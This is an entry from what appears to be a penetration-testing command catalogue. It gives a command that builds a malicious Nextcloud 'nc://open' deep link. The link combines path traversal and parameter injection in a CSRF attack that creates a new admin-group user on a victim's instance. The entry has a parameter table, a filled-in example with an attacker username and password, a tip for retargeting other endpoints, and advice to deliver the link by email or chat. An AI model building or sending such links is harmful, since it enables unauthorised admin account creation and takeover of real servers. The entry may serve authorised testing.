---
id: cmd-uuid-1
data: >-
  echo
  'nc://open/{victim-username}@{instance-url}/.\\&userid={new-user}&password={pass}&displayName={name}&email={email}&groups[]=admin&\\..\\.owncloudsync.log?token=../../../../../../../ocs/v1.php/cloud/users'
tags:
  - csrf
  - deep-link
type: command
output: null
executor: plaintext
platforms:
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:43.055Z'
verified: false
validated: true
submitted: true
---
# construct-nextcloud-deeplink

## Command

```bash
echo 'nc://open/{victim-username}@{instance-url}/.\\&userid={new-user}&password={pass}&displayName={name}&email={email}&groups[]=admin&\\..\\.owncloudsync.log?token=../../../../../../../ocs/v1.php/cloud/users'
```

## Description

Generates a malicious Nextcloud deeplink string for CSRF exploitation, incorporating path traversal and parameter injection. Use in a text editor or script to create the link for delivery.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| {victim-username} | Victim's Nextcloud username | Yes |
| {instance-url} | Target Nextcloud server URL | Yes |
| {new-user} | Desired new username (e.g., hacker) | Yes |
| {pass} | Password for new user | Yes |
| {name} | Display name | Yes |
| {email} | Email for new user | Yes |

## Examples

### Basic Usage

```bash
echo 'nc://open/admin@pentest.cloud.wtf/.\\&userid=hacker&password=h4ck3rPassw0Rd!&displayName=hacker&email=mail@example.com&groups[]=admin&\\..\\.owncloudsync.log?token=../../../../../../../ocs/v1.php/cloud/users'
```

### Advanced Usage

Customize for different endpoints by adjusting token traversal path.

```bash
echo 'nc://open/user@target.com/...?token=../other/endpoint'
```

## Expected Output

Printed string ready for copy-paste into email or chat: e.g., `nc://open/admin@pentest.cloud.wtf/...`

## Related

- [[Related Procedure]]
